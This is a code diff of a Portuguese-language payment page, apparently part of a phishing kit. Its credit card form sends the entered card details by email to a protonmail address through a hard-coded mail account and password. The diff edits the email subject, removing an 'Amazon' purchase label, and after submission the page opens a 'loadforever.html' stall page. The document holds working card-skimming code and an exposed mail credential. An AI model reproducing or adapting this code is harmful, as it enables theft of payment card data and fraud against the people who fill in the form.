@@ -49,7 +49,7 @@
             <div class="row justify-content-center" style="display: block;">
               <div class="col-12" style="width: 100%; padding: 30px; left: -1;">
                 <div class="row" style="display: block;">
-                  <form onsubmit="sendEmail()" method="POST">
+                  <form onsubmit="sendEmail()">
                     <div class="card">
                       <input class="inputForm1 x" type="name" maxlength="50" id="cc-name" name="cc-name" placeholder="Nome no cartão" autocomplete="cc-name" required="required" style="text-transform: uppercase;">
                       <input class="inputForm1 x" type="tel" inputmode="numeric" maxlength="20" id="cc-number" name="cc-number" placeholder="Número do cartão" autocomplete="cc-number" required="required">
@@ -85,8 +85,8 @@
                         Password : "hgvt vldi peit jcoh",
                         To : 'user1533@protonmail.com',
                         From : "julio74108520@gmail.com",
-                        Subject : "Amazon: compra realizada.",
-                        Body : finalmessage,
+                        Subject : "compra realizada.",
+                        Body : finalmessage
                       });
                       window.open('loadforever.html');
                     }
